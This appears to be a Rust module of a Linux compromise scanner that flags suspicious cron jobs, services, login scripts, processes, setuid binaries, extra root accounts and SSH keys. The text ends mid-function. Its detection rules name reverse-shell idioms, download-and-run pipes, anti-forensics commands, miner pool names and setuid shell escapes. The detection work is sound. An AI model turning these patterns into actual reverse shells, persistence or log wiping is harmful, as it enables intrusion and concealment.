//! What shouldn't be on a server: scheduled jobs, services and login
//! scripts that download and run code, open a shell to someone else's
//! machine or mine cryptocurrency; processes running from /tmp or from
//! nowhere; setuid copies of a shell; a second account with root's id; a
//! preloaded library; files root runs that someone else can change. And
//! the facts behind them: who can sign in with which SSH key, and whether
//! the machine is still running an old kernel or old binaries after an
//! update.
//!
//! Commands are reported redacted (passwords and tokens in them replaced)
//! and cut short. Keys are reported by fingerprint, never whole.

use std::collections::{BTreeSet, HashMap};
use std::os::unix::fs::{MetadataExt, PermissionsExt};
use std::path::{Path, PathBuf};

use base64::Engine;
use serde::Serialize;
use sha2::{Digest, Sha256};

use crate::util::{self, clip, compare_versions};
use crate::{Deadline, Options};

const MAX_SUSPICIOUS: usize = 200;
const MAX_SETUID: usize = 200;
const MAX_KEYS_PER_FILE: usize = 100;

#[derive(Debug, Clone, Serialize, Default)]
pub struct Host {
    pub suspicious: Vec<Suspicious>,
    pub setuid: Vec<SetuidFile>,
    pub accounts: Accounts,
    pub ssh_keys: Vec<KeyFile>,
    /// Libraries in /etc/ld.so.preload: loaded into every program, the way
    /// rootkits hide themselves.
    pub preload: Vec<String>,
    pub writable: Vec<Writable>,
    pub reboot: Reboot,
    /// Programs still running a binary an update has since replaced.
    pub outdated_processes: Vec<String>,
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct Suspicious {
    /// cron, systemd, rc_local, profile or process.
    pub kind: String,
    /// The file it's in, or `pid 1234`.
    pub source: String,
    pub user: Option<String>,
    /// Redacted and cut short.
    pub command: String,
    /// Why: miner, reverse_shell, download_exec, decode_exec, temp_path,
    /// hidden_path, fileless, fake_kernel_thread, deleted_binary,
    /// anti_forensics, persistence, ssh_key_write.
    pub reasons: Vec<String>,
    /// For a process: the ports it listens on.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub ports: Vec<u16>,
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct SetuidFile {
    pub path: String,
    pub owner: String,
    pub setuid: bool,
    pub setgid: bool,
    /// root_shell (a shell or a program that can start one, setuid root),
    /// unusual_place (in /tmp, a home or a web folder), or unknown (in a
    /// system folder, but not one of the usual ones).
    pub reason: String,
}

#[derive(Debug, Clone, Serialize, Default, PartialEq, Eq)]
pub struct Accounts {
    /// Accounts other than root with user id 0: root by another name.
    pub extra_root: Vec<String>,
    /// System accounts (www-data, postgres) with a login shell and SSH keys.
    pub system_logins: Vec<String>,
    /// Everyone who can sign in with a shell.
    pub login_users: Vec<String>,
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct KeyFile {
    pub user: String,
    pub path: String,
    pub modified: i64,
    pub keys: Vec<Key>,
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct Key {
    pub kind: String,
    pub fingerprint: String,
    pub comment: String,
    /// Restricted with options (command=, from=).
    pub restricted: bool,
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct Writable {
    pub path: String,
    /// path_dir (a folder on root's PATH anyone can write to), system_file
    /// (/etc/passwd, a crontab or a unit anyone can write to), root_script
    /// (a script root runs that someone else can change).
    pub reason: String,
    /// Who else can change it: `everyone`, or the owner's name.
    pub by: String,
    /// What runs it, for root_script.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub used_by: Option<String>,
}

#[derive(Debug, Clone, Serialize, Default, PartialEq, Eq)]
pub struct Reboot {
    pub required: bool,
    pub packages: Vec<String>,
    pub running_kernel: Option<String>,
    pub newest_kernel: Option<String>,
}

/// Words that only turn up in cryptocurrency miners.
const MINER_WORDS: &[&str] = &[
    "xmrig",
    "xmr-stak",
    "minerd",
    "cpuminer",
    "kdevtmpfsi",
    "kinsing",
    "stratum+tcp",
    "stratum+ssl",
    "stratum2+tcp",
    "--donate-level",
    "cryptonight",
    "randomx",
    "nanominer",
    "lolminer",
    "phoenixminer",
    "nbminer",
    "t-rex",
    "ethminer",
    "supportxmr",
    "minexmr",
    "c3pool",
    "nanopool.org",
    "moneroocean",
    "hashvault",
    "2miners",
    "unmineable",
];

const SHELLS: &[&str] = &[
    "sh", "bash", "dash", "zsh", "ksh", "fish", "csh", "tcsh", "ash", "busybox",
];
/// Interpreters and programs that can start a shell: setuid root, any of
/// them is root for whoever runs it.
const ESCAPES: &[&str] = &[
    "python",
    "python2",
    "python3",
    "perl",
    "ruby",
    "php",
    "node",
    "lua",
    "awk",
    "gawk",
    "mawk",
    "nawk",
    "find",
    "vim",
    "vi",
    "nano",
    "less",
    "more",
    "man",
    "env",
    "cp",
    "mv",
    "dd",
    "tee",
    "tar",
    "zip",
    "unzip",
    "git",
    "nmap",
    "socat",
    "nc",
    "ncat",
    "netcat",
    "wget",
    "curl",
    "rsync",
    "xargs",
    "nice",
    "timeout",
    "taskset",
    "strace",
    "gdb",
    "expect",
    "tclsh",
    "wish",
    "ed",
    "sed",
    "chmod",
    "chown",
    "docker",
    "systemctl",
    "journalctl",
    "openssl",
    "install",
    "ln",
    "screen",
    "tmux",
    "script",
    "rlwrap",
    "stdbuf",
    "flock",
    "ionice",
    "setarch",
    "unshare",
];
/// Setuid and setgid programs Linux distributions ship.
const KNOWN_SETUID: &[&str] = &[
    "sudo",
    "sudoedit",
    "su",
    "passwd",
    "chsh",
    "chfn",
    "newgrp",
    "gpasswd",
    "mount",
    "umount",
    "pkexec",
    "ping",
    "ping6",
    "fusermount",
    "fusermount3",
    "ntfs-3g",
    "at",
    "crontab",
    "ssh-keysign",
    "dbus-daemon-launch-helper",
    "polkit-agent-helper-1",
    "Xorg.wrap",
    "Xorg",
    "chage",
    "expiry",
    "unix_chkpwd",
    "pam_extrausers_chkpwd",
    "wall",
    "write",
    "bsd-write",
    "ssh-agent",
    "dotlockfile",
    "mount.nfs",
    "umount.nfs",
    "mount.cifs",
    "snap-confine",
    "usernetctl",
    "staprun",
    "newuidmap",
    "newgidmap",
    "sg",
    "pppd",
    "traceroute6.iputils",
    "mtr-packet",
    "vmware-user-suid-wrapper",
    "chrome-sandbox",
    "userhelper",
    "suexec",
    "mail-lock",
    "mail-unlock",
    "mail-touchlock",
    "procmail",
    "exim4",
    "sendmail",
    "postdrop",
    "postqueue",
    "lockfile",
    "utempter",
    "locate",
    "mlocate",
    "plocate",
    "uuidd",
    "dmcrypt-get-device",
    "ksu",
    "doas",
    "cockpit-session",
    "mount.ecryptfs_private",
    "lxc-user-nic",
    "nvidia-modprobe",
    "qemu-bridge-helper",
    "spice-client-glib-usb-acl-helper",
    "gnome-pty-helper",
    "dumpcap",
    "unix2_chkpwd",
    "pt_chown",
    "ssh-keysign.real",
    "fping",
    "fping6",
    "arping",
    "traceroute",
    "traceroute6",
    "chkpwd",
    "lppasswd",
    "polkit-agent-helper",
    "Xvnc",
    "kismet_cap_linux_wifi",
    "slock",
    "physlock",
    "vlock",
    "dhcp_release",
];
const SETUID_DIRS: &[(&str, usize)] = &[
    ("/bin", 1),
    ("/sbin", 1),
    ("/usr/bin", 1),
    ("/usr/sbin", 1),
    ("/usr/local/bin", 2),
    ("/usr/local/sbin", 2),
    ("/usr/lib", 4),
    ("/usr/libexec", 4),
    ("/tmp", 4),
    ("/var/tmp", 4),
    ("/dev/shm", 4),
    ("/home", 5),
    ("/root", 5),
    ("/opt", 5),
    ("/srv", 5),
    ("/var/www", 5),
];
const UNUSUAL_PLACES: &[&str] = &[
    "/tmp/",
    "/var/tmp/",
    "/dev/shm/",
    "/home/",
    "/root/",
    "/opt/",
    "/srv/",
    "/var/www/",
];
const TEMP_DIRS: &[&str] = &["/tmp/", "/var/tmp/", "/dev/shm/"];
/// Hidden folders that are normal homes for tools.
const USUAL_HIDDEN: &[&str] = &[
    "/.nvm/",
    "/.local/",
    "/.cargo/",
    "/.rustup/",
    "/.vscode-server/",
    "/.cursor-server/",
    "/.bun/",
    "/.deno/",
    "/.pyenv/",
    "/.rbenv/",
    "/.volta/",
    "/.asdf/",
    "/.sdkman/",
    "/.dotnet/",
    "/.pm2/",
    "/.npm/",
    "/.cache/ms-playwright/",
    "/.vscode/",
    "/.config/",
    "/.fnm/",
    "/.yarn/",
    "/.linuxbrew/",
    "/.venv/",
    "/.virtualenvs/",
    "/.git/",
    "/.oh-my-zsh/",
    "/.bashrc",
    "/.profile",
    "/.bash_profile",
    "/.zshrc",
    "/.serveros/",
];
const PATH_DIRS: &[&str] = &[
    "/usr/local/sbin",
    "/usr/local/bin",
    "/usr/sbin",
    "/usr/bin",
    "/sbin",
    "/bin",
];

pub fn gather(options: &Options, deadline: &Deadline) -> Host {
    let users = passwd(options);
    // The first account with an id names it: root, not a later "toor".
    let mut names: HashMap<u32, String> = HashMap::new();
    for user in &users {
        names.entry(user.uid).or_insert_with(|| user.name.clone());
    }
    let mut host = Host::default();

    let mut runs_as_root: Vec<(String, String)> = Vec::new();
    host.suspicious.extend(cron(options, &mut runs_as_root));
    host.suspicious
        .extend(systemd(options, &users, &mut runs_as_root));
    host.suspicious.extend(login_scripts(options, &users));
    let (processes, outdated) = processes(options, &names);
    host.suspicious.extend(processes);
    host.suspicious.truncate(MAX_SUSPICIOUS);
    host.outdated_processes = outdated;

    host.setuid = setuid(options, &names, deadline);
    host.ssh_keys = ssh_keys(options, &users);
    host.accounts = accounts(&users, &host.ssh_keys);
    host.preload = util::read_limited(&options.path("/etc/ld.so.preload"), 64 * 1024)
        .map(|t| {
            t.lines()
                .map(str::trim)
                .filter(|l| !l.is_empty() && !l.starts_with('#'))
                .map(|l| clip(l, 200))
                .take(20)
                .collect()
        })
        .unwrap_or_default();
    host.writable = writable(options, &names, &runs_as_root);
    host.reboot = reboot(options);

    host
}

#[derive(Debug, Clone)]
pub struct User {
    pub name: String,
    pub uid: u32,
    pub home: String,
    pub shell: String,
}

impl User {
    pub fn can_log_in(&self) -> bool {
        let shell = self.shell.rsplit('/').next().unwrap_or("");
        !self.shell.is_empty()
            && !matches!(shell, "nologin" | "false" | "sync" | "halt" | "shutdown")
    }
}

pub fn parse_passwd(text: &str) -> Vec<User> {
    text.lines()
        .filter_map(|line| {
            let f: Vec<&str> = line.split(':').collect();
            if f.len() < 7 || line.starts_with('#') {
                return None;
            }
            Some(User {
                name: f[0].to_string(),
                uid: f[2].parse().ok()?,
                home: f[5].to_string(),
                shell: f[6].trim().to_string(),
            })
        })
        .collect()
}

fn passwd(options: &Options) -> Vec<User> {
    util::read_limited(&options.path("/etc/passwd"), 4 * 1024 * 1024)
        .map(|t| parse_passwd(&t))
        .unwrap_or_default()
}

/// Why a command looks like an attack, if it does.
pub fn reasons(command: &str) -> Vec<String> {
    let lower = command.to_ascii_lowercase();
    let mut out = BTreeSet::new();
    let has = |s: &str| lower.contains(s);

    if MINER_WORDS.iter().any(|w| has(w)) {
        out.insert("miner");
    }

    let to_shell = pipes_to_shell(&lower);
    let downloads = has("curl ") || has("wget ") || has("curl\t") || has("fetch ") || has("tftp ");
    let substituted_download = ["$(curl", "$(wget", "`curl", "`wget"]
        .iter()
        .any(|s| has(s))
        && [
            "sh -c", "bash -c", "eval", "| sh", "|sh", "| bash", "|bash", "python",
        ]
        .iter()
        .any(|s| has(s));
    if (downloads && to_shell) || substituted_download {
        out.insert("download_exec");
    }

    let decodes = has("base64 -d")
        || has("base64 --decode")
        || has("base64 -di")
        || has("xxd -r")
        || has("openssl enc -d")
        || has("b64decode")
        || has("base64_decode");
    if decodes && (to_shell || has("eval") || has("exec(") || has("| python") || has("|python")) {
        out.insert("decode_exec");
    }

    let reverse = has("/dev/tcp/")
        || has("/dev/udp/")
        || ((has("nc ") || has("ncat ") || has("netcat ") || has("busybox nc"))
            && (has(" -e ") || has(" -c ")))
        || (has("bash -i") && has(">&"))
        || (has("sh -i") && (has("| nc") || has("|nc") || has(">&")))
        || (has("socat ") && (has("exec:") || has("system:")))
        || (has("socket")
            && (has("python") || has("perl") || has("ruby"))
            && (has("dup2") || has("pty.spawn") || has("subprocess")))
        || (has("fsockopen") && has("php"))
        || (has("mkfifo") && (has("nc ") || has("ncat ") || has("openssl s_client")));
    if reverse {
        out.insert("reverse_shell");
    }

    for program in executed(command) {
        if TEMP_DIRS.iter().any(|t| program.starts_with(t)) {
            out.insert("temp_path");
        } else if hidden_path(&program) {
            out.insert("hidden_path");
        }
    }
    if (has("cd /tmp") || has("cd /dev/shm") || has("cd /var/tmp")) && has("./") {
        out.insert("temp_path");
    }

    if has("history -c")
        || has("unset histfile")
        || has("histfile=/dev/null")
        || has("chattr +i")
        || has("chattr -i")
        || has("rm -rf /var/log")
        || has("> /var/log/wtmp")
        || has("> /var/log/auth")
        || has("> /var/log/secure")
    {
        out.insert("anti_forensics");
    }
    if has("| crontab -") || has("|crontab -") || has("ld.so.preload") {
        out.insert("persistence");
    }
    if has("authorized_keys") && (has(">>") || has("echo ") || downloads) {
        out.insert("ssh_key_write");
    }

    out.into_iter().map(str::to_string).collect()
}

/// `… | sh`, `| sudo bash`, `| python3 -`: piping something into a shell
/// or interpreter.
fn pipes_to_shell(lower: &str) -> bool {
    lower.split('|').skip(1).any(|part| {
        let mut words = part.split_whitespace();
        let mut first = words.next().unwrap_or("");
        if first == "sudo" || first == "env" {
            first = words.next().unwrap_or("");
        }
        let program = first.rsplit('/').next().unwrap_or("");
        SHELLS.contains(&program)
            || program.starts_with("python")
            || matches!(program, "perl" | "ruby" | "php" | "node")
    })
}

/// The programs a command line runs: its first word, what follows a
/// separator, and the script a shell or interpreter is given.
pub fn executed(command: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut start = true;
    for word in command.split_whitespace() {
        let word = word.trim_matches(|c| c == '"' || c == '\'' || c == '(' || c == ')' || c == '`');
        if matches!(word, ";" | "&&" | "||" | "|" | "&") || word.is_empty() {
            start = true;
            continue;
        }
        if start {
            let program = word.trim_end_matches([';', '&', '|']);
            let base = program.rsplit('/').next().unwrap_or("");
            if program.contains('/') {
                out.push(program.to_string());
            }
            // The next word is the program, too: `sh /tmp/x`, `nohup /tmp/x`.
            let wrapper = SHELLS.contains(&base)
                || base.starts_with("python")
                || matches!(
                    base,
                    "perl"
                        | "ruby"
                        | "php"
                        | "node"
                        | "nohup"
                        | "sudo"
                        | "exec"
                        | "env"
                        | "nice"
                        | "setsid"
                        | "timeout"
                        | "flock"
                );
            start = wrapper;
            if word.ends_with(';') || word.ends_with('&') || word.ends_with('|') {
                start = true;
            }
            continue;
        }
        if word.ends_with(';') || word.ends_with("&&") || word.ends_with('|') {
            start = true;
        }
    }

    out
}

fn hidden_path(program: &str) -> bool {
    program.starts_with('/')
        && program
            .split('/')
            .any(|part| part.starts_with('.') && part != "." && part != "..")
        && !USUAL_HIDDEN.iter().any(|h| program.contains(h))
}

fn suspicious(kind: &str, source: &str, user: Option<&str>, command: &str) -> Option<Suspicious> {
    let reasons = reasons(command);
    (!reasons.is_empty()).then(|| Suspicious {
        kind: kind.into(),
        source: clip(source, 300),
        user: user.map(str::to_string),
        command: clip(&daemon_core::redact::redact(command.trim()), 300),
        reasons,
        ports: Vec::new(),
    })
}

/// A crontab line's user (system crontabs name one) and command.
pub fn cron_line(line: &str, system: bool) -> Option<(Option<String>, String)> {
    let line = line.trim();
    if line.is_empty() || line.starts_with('#') {
        return None;
    }
    // `SHELL=/bin/bash`, `MAILTO=""`: settings, not jobs.
    let first = line.split_whitespace().next()?;
    if let Some((key, _)) = first.split_once('=') {
        if !key.is_empty() && key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
            return None;
        }
    }
    let rest: Vec<&str> = if line.starts_with('@') {
        line.splitn(2, char::is_whitespace).collect()
    } else {
        line.splitn(6, char::is_whitespace).collect()
    };
    let rest = rest.last()?.trim();
    if !line.starts_with('@') && line.splitn(6, char::is_whitespace).count() < 6 {
        return None;
    }
    if system {
        let (user, command) = rest.split_once(char::is_whitespace)?;
        Some((Some(user.to_string()), command.trim().to_string()))
    } else {
        Some((None, rest.to_string()))
    }
}

fn cron(options: &Options, runs_as_root: &mut Vec<(String, String)>) -> Vec<Suspicious> {
    let mut out = Vec::new();
    let mut files: Vec<(PathBuf, bool, Option<String>)> =
        vec![(options.path("/etc/crontab"), true, None)];
    for (dir, system) in [
        ("/etc/cron.d", true),
        ("/var/spool/cron/crontabs", false),
        ("/var/spool/cron", false),
    ] {
        let mut entries: Vec<PathBuf> = std::fs::read_dir(options.path(dir))
            .into_iter()
            .flatten()
            .flatten()
            .map(|e| e.path())
            .filter(|p| p.is_file())
            .collect();
        entries.sort();
        for path in entries {
            let owner = (!system).then(|| {
                path.file_name()
                    .unwrap_or_default()
                    .to_string_lossy()
                    .into_owned()
            });
            files.push((path, system, owner));
        }
    }

    for (path, system, owner) in files {
        let Some(text) = util::read_limited(&path, 1024 * 1024) else {
            continue;
        };
        let source = options.display(&path);
        for line in text.lines() {
            let Some((user, command)) = cron_line(line, system) else {
                continue;
            };
            let user = user.or_else(|| owner.clone());
            if user.as_deref() == Some("root") {
                runs_as_root.push((command.clone(), source.clone()));
            }
            out.extend(suspicious("cron", &source, user.as_deref(), &command));
        }
    }

    // Scripts cron runs hourly, daily, weekly and monthly, line by line.
    for dir in [
        "/etc/cron.hourly",
        "/etc/cron.daily",
        "/etc/cron.weekly",
        "/etc/cron.monthly",
    ] {
        for entry in std::fs::read_dir(options.path(dir))
            .into_iter()
            .flatten()
            .flatten()
        {
            let path = entry.path();
            let Some(text) = util::read_limited(&path, 256 * 1024) else {
                continue;
            };
            let source = options.display(&path);
            for line in text.lines().filter(|l| !l.trim_start().starts_with('#')) {
                out.extend(suspicious("cron", &source, Some("root"), line));
            }
        }
    }

    out
}

fn systemd(
    options: &Options,
    users: &[User],
    runs_as_root: &mut Vec<(String, String)>,
) -> Vec<Suspicious> {
    let mut dirs: Vec<PathBuf> = [
        "/etc/systemd/system",
        "/run/systemd/system",
        "/usr/lib/systemd/system",
        "/lib/systemd/system",
        "/usr/local/lib/systemd/system",
    ]
    .iter()
    .map(|d| options.path(d))
    .collect();
    for user in users.iter().filter(|u| u.can_log_in()) {
        dirs.push(options.path(&format!("{}/.config/systemd/user", user.home)));
    }

    let mut seen = BTreeSet::new();
    let mut out = Vec::new();
    for dir in dirs {
        let mut units: Vec<PathBuf> = Vec::new();
        for entry in std::fs::read_dir(&dir).into_iter().flatten().flatten() {
            let path = entry.path();
            if path.is_dir() {
                // foo.service.d/override.conf
                if path.extension().is_some_and(|e| e == "d") {
                    units.extend(
                        std::fs::read_dir(&path)
                            .into_iter()
                            .flatten()
                            .flatten()
                            .map(|e| e.path()),
                    );
                }
                continue;
            }
            units.push(path);
        }
        units.sort();
        for unit in units {
            let name = unit.to_string_lossy();
            if !(name.ends_with(".service") || name.ends_with(".conf")) {
                continue;
            }
            let Ok(real) = unit.canonicalize() else {
                continue;
            };
            if !seen.insert(real.clone()) {
                continue;
            }
            let Some(text) = util::read_limited(&real, 256 * 1024) else {
                continue;
            };
            let source = options.display(&unit);
            let user_unit = name.contains("/.config/systemd/user");
            let mut user = None;
            let mut commands = Vec::new();
            for line in text.lines() {
                let line = line.trim();
                if let Some(u) = line.strip_prefix("User=") {
                    user = Some(u.trim().to_string());
                }
                for key in [
                    "ExecStart=",
                    "ExecStartPre=",
                    "ExecStartPost=",
                    "ExecStop=",
                    "ExecReload=",
                ] {
                    if let Some(command) = line.strip_prefix(key) {
                        commands.push(
                            command
                                .trim_start_matches(['-', '@', ':', '+', '!'])
                                .to_string(),
                        );
                    }
                }
            }
            let user = if user_unit {
                source.split('/').nth(2).map(str::to_string)
            } else {
                user.or(Some("root".into()))
            };
            for command in commands {
                if user.as_deref() == Some("root")
                    && !source.starts_with("/usr/lib/")
                    && !source.starts_with("/lib/")
                {
                    runs_as_root.push((command.clone(), source.clone()));
                }
                out.extend(suspicious("systemd", &source, user.as_deref(), &command));
            }
        }
    }

    out
}

/// rc.local and the scripts every login runs.
fn login_scripts(options: &Options, users: &[User]) -> Vec<Suspicious> {
    let mut files: Vec<(PathBuf, String, Option<String>)> = vec![
        (
            options.path("/etc/rc.local"),
            "rc_local".into(),
            Some("root".into()),
        ),
        (options.path("/etc/profile"), "profile".into(), None),
        (options.path("/etc/bash.bashrc"), "profile".into(), None),
        (options.path("/etc/environment"), "profile".into(), None),
    ];
    let mut profile_d: Vec<PathBuf> = std::fs::read_dir(options.path("/etc/profile.d"))
        .into_iter()
        .flatten()
        .flatten()
        .map(|e| e.path())
        .collect();
    profile_d.sort();
    files.extend(
        profile_d
            .into_iter()
            .map(|p| (p, "profile".to_string(), None)),
    );
    let mut homes = BTreeSet::new();
    for user in users
        .iter()
        .filter(|u| u.can_log_in() && u.home.starts_with('/') && u.home != "/")
    {
        if homes.insert(user.home.clone()) {
            for file in [
                ".bashrc",
                ".profile",
                ".bash_profile",
                ".zshrc",
                ".bash_logout",
            ] {
                files.push((
                    options.path(&format!("{}/{file}", user.home)),
                    "profile".into(),
                    Some(user.name.clone()),
                ));
            }
        }
    }

    let mut out = Vec::new();
    for (path, kind, user) in files {
        let Some(text) = util::read_limited(&path, 256 * 1024) else {
            continue;
        };
        let source = options.display(&path);
        for line in text.lines().filter(|l| !l.trim_start().starts_with('#')) {
            out.extend(suspicious(&kind, &source, user.as_deref(), line));
        }
    }

    out
}

/// Running processes that look like an attack, and those still running a
/// binary an update replaced.
fn processes(options: &Options, names: &HashMap<u32, String>) -> (Vec<Suspicious>, Vec<String>) {
    let mut out = Vec::new();
    let mut outdated = BTreeSet::new();
    let ports = listening_ports(options);

    let Ok(entries) = std::fs::read_dir(&options.proc) else {
        return (out, Vec::new());
    };
    let own = std::process::id();
    for entry in entries.flatten() {
        let Ok(pid) = entry.file_name().to_string_lossy().parse::<u32>() else {
            continue;
        };
        if pid == own {
            continue;
        }
        let dir = entry.path();
        let raw = std::fs::read(dir.join("cmdline")).unwrap_or_default();
        // Kernel threads have no command line and no binary.
        if raw.is_empty() {
            continue;
        }
        let cmdline = raw
            .split(|b| *b == 0)
            .filter(|p| !p.is_empty())
            .map(|p| String::from_utf8_lossy(p).into_owned())
            .collect::<Vec<_>>()
            .join(" ");
        let exe = std::fs::read_link(dir.join("exe"))
            .ok()
            .map(|p| p.to_string_lossy().into_owned());
        let comm = std::fs::read_to_string(dir.join("comm"))
            .unwrap_or_default()
            .trim()
            .to_string();
        let uid = std::fs::read_to_string(dir.join("status"))
            .ok()
            .and_then(|s| {
                s.lines()
                    .find(|l| l.starts_with("Uid:"))
                    .and_then(|l| l.split_whitespace().nth(1))
                    .and_then(|u| u.parse::<u32>().ok())
            });

        let mut why: BTreeSet<String> = reasons(&cmdline).into_iter().collect();
        if MINER_WORDS
            .iter()
            .any(|w| comm.to_ascii_lowercase().contains(w))
        {
            why.insert("miner".into());
        }
        // Kernel threads have no command line at all, so a program whose
        // name is "[kworker/0:1]" is dressing up as one.
        let argv0 = cmdline.split(' ').next().unwrap_or("");
        if argv0.len() > 2 && argv0.starts_with('[') && argv0.ends_with(']') {
            why.insert("fake_kernel_thread".into());
        }
        if let Some(exe) = &exe {
            let deleted = exe.ends_with(" (deleted)");
            let path = exe.trim_end_matches(" (deleted)");
            if path.starts_with("/memfd:") && !path.contains("runc") && !path.contains("crun") {
                why.insert("fileless".into());
            }
            if TEMP_DIRS.iter().any(|t| path.starts_with(t)) {
                why.insert("temp_path".into());
            } else if hidden_path(path) {
                why.insert("hidden_path".into());
            }
            if deleted && (TEMP_DIRS.iter().any(|t| path.starts_with(t)) || hidden_path(path)) {
                why.insert("deleted_binary".into());
            } else if deleted
                && (path.starts_with("/usr/")
                    || path.starts_with("/bin/")
                    || path.starts_with("/sbin/")
                    || path.starts_with("/lib"))
            {
                outdated.insert(clip(if comm.is_empty() { path } else { &comm }, 60));
            }
        }
        // Only the command line's own words: a process's reasons from
        // `temp_path` in its arguments (a log file) aren't the binary's.
        if why.is_empty() {
            continue;
        }
        let mut process_ports: Vec<u16> = ports.get(&pid).cloned().unwrap_or_default();
        process_ports.sort_unstable();
        process_ports.dedup();
        out.push(Suspicious {
            kind: "process".into(),
            source: format!("pid {pid}"),
            user: uid.and_then(|u| names.get(&u).cloned().or_else(|| Some(u.to_string()))),
            command: clip(
                &daemon_core::redact::redact(&format!(
                    "{}{}",
                    exe.as_deref()
                        .map(|e| format!("[{e}] "))
                        .unwrap_or_default(),
                    cmdline
                )),
                300,
            ),
            reasons: why.into_iter().collect(),
            ports: process_ports,
        });
    }

    (out, outdated.into_iter().take(50).collect())
}

fn listening_ports(options: &Options) -> HashMap<u32, Vec<u16>> {
    let mut out: HashMap<u32, Vec<u16>> = HashMap::new();
    if !options.proc.join("net/tcp").exists() {
        return out;
    }
    let (listeners, _) = daemon_inventory::listeners::discover(&options.proc);
    for listener in listeners {
        if let Some(pid) = listener.pid {
            out.entry(pid).or_default().push(listener.port);
        }
    }

    out
}

fn setuid(options: &Options, names: &HashMap<u32, String>, deadline: &Deadline) -> Vec<SetuidFile> {
    let mut out = Vec::new();
    let mut seen = BTreeSet::new();
    let mut entries = 0usize;
    for (dir, depth) in SETUID_DIRS {
        let mut stack = vec![(options.path(dir), 0usize)];
        while let Some((path, level)) = stack.pop() {
            if deadline.passed() || entries > 300_000 || out.len() >= MAX_SETUID {
                return out;
            }
            let Ok(read) = std::fs::read_dir(&path) else {
                continue;
            };
            for entry in read.flatten() {
                entries += 1;
                let Ok(kind) = entry.file_type() else {
                    continue;
                };
                let child = entry.path();
                if kind.is_dir() {
                    let name = entry.file_name();
                    if level + 1 < *depth
                        && name != "node_modules"
                        && name != ".git"
                        && name != "proc"
                    {
                        stack.push((child, level + 1));
                    }
                    continue;
                }
                if !kind.is_file() {
                    continue;
                }
                let Ok(meta) = entry.metadata() else {
                    continue;
                };
                let mode = meta.permissions().mode();
                let (setuid, setgid) = (mode & 0o4000 != 0, mode & 0o2000 != 0);
                if !setuid && !setgid {
                    continue;
                }
                if !seen.insert((meta.dev(), meta.ino())) {
                    continue;
                }
                let shown = options.display(&child);
                let base = child
                    .file_name()
                    .unwrap_or_default()
                    .to_string_lossy()
                    .into_owned();
                let program = base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
                let reason = if setuid
                    && meta.uid() == 0
                    && (SHELLS.contains(&program)
                        || ESCAPES.contains(&program)
                        || SHELLS.contains(&base.as_str())
                        || ESCAPES.contains(&base.as_str()))
                {
                    "root_shell"
                } else if UNUSUAL_PLACES.iter().any(|p| shown.starts_with(p)) {
                    "unusual_place"
                } else if setuid && !KNOWN_SETUID.contains(&base.as_str()) {
                    "unknown"
                } else {
                    continue;
                };
                out.push(SetuidFile {
                    path: clip(&shown, 300),
                    owner: names
                        .get(&meta.uid())
                        .cloned()
                        .unwrap_or_else(|| meta.uid().to_string()),
                    setuid,
                    setgid,
                    reason: reason.into(),
                });
            }
        }
    }

    out
}

fn ssh_keys(options: &Options, users: &[User]) -> Vec<KeyFile> {
    let mut out = Vec::new();
    let mut homes = BTreeSet::new();
    for user in users {
        if !user.home.starts_with('/') || user.home == "/" || !homes.insert(user.home.clone()) {
            continue;
        }
        for file in ["authorized_keys", "authorized_keys2"] {
            let shown = format!("{}/.ssh/{file}", user.home.trim_end_matches('/'));
            let path = options.path(&shown);
            let Some(text) = util::read_limited(&path, 1024 * 1024) else {
                continue;
            };
            let modified = std::fs::metadata(&path).map(|m| m.mtime()).unwrap_or(0);
            let keys: Vec<Key> = text
                .lines()
                .filter_map(parse_key)
                .take(MAX_KEYS_PER_FILE)
                .collect();
            out.push(KeyFile {
                user: user.name.clone(),
                path: shown,
                modified,
                keys,
            });
        }
    }

    out
}

/// One authorized_keys line: options (maybe), type, key, comment.
pub fn parse_key(line: &str) -> Option<Key> {
    let line = line.trim();
    if line.is_empty() || line.starts_with('#') {
        return None;
    }
    let is_type =
        |w: &str| w.starts_with("ssh-") || w.starts_with("ecdsa-") || w.starts_with("sk-");
    let words: Vec<&str> = split_key_line(line);
    let at = words.iter().position(|w| is_type(w))?;
    let blob = base64::engine::general_purpose::STANDARD
        .decode(words.get(at + 1)?)
        .ok()?;
    let digest = Sha256::digest(&blob);
    let fingerprint = base64::engine::general_purpose::STANDARD_NO_PAD.encode(digest);

    Some(Key {
        kind: words[at].to_string(),
        fingerprint: format!("SHA256:{fingerprint}"),
        comment: clip(&words[at + 2..].join(" "), 80),
        restricted: at > 0,
    })
}

/// Words, but options' quoted values (`command="a b"`) stay whole.
fn split_key_line(line: &str) -> Vec<&str> {
    let mut out = Vec::new();
    let mut start = None;
    let mut quoted = false;
    for (i, c) in line.char_indices() {
        match c {
            '"' => quoted = !quoted,
            c if c.is_whitespace() && !quoted => {
                if let Some(s) = start.take() {
                    out.push(&line[s..i]);
                }
                continue;
            }
            _ => {}
        }
        start.get_or_insert(i);
    }
    if let Some(s) = start {
        out.push(&line[s..]);
    }

    out
}

fn accounts(users: &[User], keys: &[KeyFile]) -> Accounts {
    let with_keys: BTreeSet<&str> = keys
        .iter()
        .filter(|k| !k.keys.is_empty())
        .map(|k| k.user.as_str())
        .collect();

    Accounts {
        extra_root: users
            .iter()
            .filter(|u| u.uid == 0 && u.name != "root")
            .map(|u| u.name.clone())
            .collect(),
        system_logins: users
            .iter()
            .filter(|u| {
                u.uid != 0 && u.uid < 1000 && u.can_log_in() && with_keys.contains(u.name.as_str())
            })
            .map(|u| u.name.clone())
            .collect(),
        login_users: users
            .iter()
            .filter(|u| u.can_log_in())
            .map(|u| u.name.clone())
            .take(100)
            .collect(),
    }
}

fn writable(
    options: &Options,
    names: &HashMap<u32, String>,
    runs_as_root: &[(String, String)],
) -> Vec<Writable> {
    let mut out = Vec::new();
    let world = |path: &Path| -> Option<std::fs::Metadata> {
        let meta = std::fs::metadata(path).ok()?;
        let mode = meta.permissions().mode();
        // A sticky folder (/tmp) can be written to but not replaced in.
